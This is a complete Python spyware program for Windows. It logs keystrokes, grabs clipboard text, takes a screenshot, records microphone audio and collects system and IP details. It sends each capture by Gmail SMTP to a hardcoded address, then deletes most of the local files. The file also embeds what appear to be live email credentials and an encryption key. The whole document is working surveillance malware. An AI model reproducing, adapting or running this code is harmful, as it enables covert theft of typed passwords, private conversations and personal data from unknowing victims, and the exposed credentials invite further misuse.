# ----------------------------
#          Imports
# ----------------------------
import os
import time
import socket
import platform
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from requests import get
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
import win32clipboard
from scipy.io.wavfile import write
import sounddevice as sd
from PIL import ImageGrab

# ----------------------------
#        Config/Constants
# ----------------------------
KEY = b"1z68XoIR--DJZbrMdkE6e13ESaUMnFW0NCEYuFHSfc4="
FROM_EMAIL = "francopanko6@gmail.com"
EMAIL_PASSWORD = "wucm qbdz kwlx puop"
TO_EMAIL = FROM_EMAIL

LOG_FILE = 'key_log.txt'
SYSTEM_INFO_FILE = 'system.txt'
CLIPBOARD_FILE = 'clipboard.txt'
AUDIO_FILE = 'audio.wav'
SCREENSHOT_FILE = 'screenshot.png'

ENCRYPTED_FILES = {
    SYSTEM_INFO_FILE: 'e_system.txt',
    CLIPBOARD_FILE: 'e_clipboard.txt',
    LOG_FILE: 'e_key_log.txt',
}

# ----------------------------
#        Email Function
# ----------------------------
def send_email(subject, body, attachment_path=None):
    try:
        msg = MIMEMultipart()
        msg['From'] = FROM_EMAIL
        msg['To'] = TO_EMAIL
        msg['Subject'] = subject

        msg.attach(MIMEText(body, 'plain'))

        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path, "rb") as attachment:
                p = MIMEBase('application', 'octet-stream')
                p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
                msg.attach(p)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(FROM_EMAIL, EMAIL_PASSWORD)
            server.send_message(msg)

        print(f"Email sent with {attachment_path or 'no attachment'}")
    except Exception as e:
        print(f"Failed to send email: {e}")

# ----------------------------
#     System Info / Clipboard
# ----------------------------
def get_system_info():
    info = [
        f"Hostname: {socket.gethostname()}",
        f"Private IP Address: {socket.gethostbyname(socket.gethostname())}"
    ]
    try:
        public_ip = get("https://api.ipify.org").text
        info.append(f"Public IP Address: {public_ip}")
    except:
        info.append("Public IP Address: Unavailable")

    info.extend([
        f"Processor: {platform.processor()}",
        f"System: {platform.system()} Version: {platform.version()}",
        f"Machine: {platform.machine()}"
    ])

    with open(SYSTEM_INFO_FILE, 'a') as f:
        f.write('\n'.join(info) + '\n')

def get_clipboard_data():
    try:
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
            data = win32clipboard.GetClipboardData()
        else:
            data = "Clipboard does not contain text"
        win32clipboard.CloseClipboard()
    except:
        data = "Clipboard could not be accessed."

    with open(CLIPBOARD_FILE, 'a') as f:
        f.write(data + '\n')

# ----------------------------
#     Microphone / Screenshot
# ----------------------------
def record_microphone(duration=10):
    freq = 44100
    recording = sd.rec(int(duration * freq), samplerate=freq, channels=2)
    sd.wait()
    write(AUDIO_FILE, freq, recording)

def take_screenshot():
    ss = ImageGrab.grab()
    ss.save(SCREENSHOT_FILE)

# ----------------------------
#         Keylogger
# ----------------------------
def write_keys(keys):
    with open(LOG_FILE, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if 'space' in k:
                f.write(' ')
            elif 'enter' in k:
                f.write('\n')
            elif 'tab' in k:
                f.write('   ')
            elif 'Key' not in k:
                f.write(k)

def start_keylogger(duration=60):
    keys = []
    count = 0
    stop_time = time.time() + duration

    def on_press(key):
        nonlocal keys, count
        keys.append(key)
        count += 1
        if count >= 1:
            write_keys(keys)
            keys = []
            count = 0

    def on_release(key):
        if key == Key.esc or time.time() > stop_time:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# ----------------------------
#     File Encryption
# ----------------------------
def encrypt_file(source, dest):
    if os.path.exists(source):
        with open(source, 'rb') as f:
            data = f.read()
        encrypted = Fernet(KEY).encrypt(data)
        with open(dest, 'wb') as f:
            f.write(encrypted)

# ----------------------------
#            Main
# ----------------------------
def main():
    get_system_info()
    get_clipboard_data()
    take_screenshot()
    record_microphone(duration=5)
    start_keylogger(duration=30)

    send_email("System Info", "Attached is the system information.", SYSTEM_INFO_FILE)
    send_email("Clipboard", "Attached is the clipboard data.", CLIPBOARD_FILE)
    send_email("Screenshot", "Attached is a screenshot.", SCREENSHOT_FILE)
    send_email("Audio", "Attached is a short audio clip.", AUDIO_FILE)
    send_email("Keystrokes", "Attached is the keylog file.", LOG_FILE)

    for src, dest in ENCRYPTED_FILES.items():
        encrypt_file(src, dest)
        send_email(f"Encrypted: {src}", "Encrypted file attached.", dest)

    time.sleep(10)
    for f in [*ENCRYPTED_FILES.keys(), *ENCRYPTED_FILES.values(), AUDIO_FILE, SCREENSHOT_FILE]:
        if os.path.exists(f):
            os.remove(f)

if __name__ == "__main__":
    main()
